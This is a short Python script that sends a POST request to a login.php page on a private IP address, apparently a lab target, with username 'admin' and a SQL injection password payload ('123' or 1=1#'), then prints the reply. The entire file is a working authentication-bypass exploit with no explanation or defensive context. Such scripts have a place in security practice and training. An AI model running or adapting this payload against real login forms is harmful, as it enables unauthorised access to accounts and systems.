import requests


url = 'http://192.168.80.128:8848/login.php'

data = {
    'username':'admin',
    'password':"123' or 1=1#"
}

r = requests.post(
    url = url,
    data = data
)

print(r.text)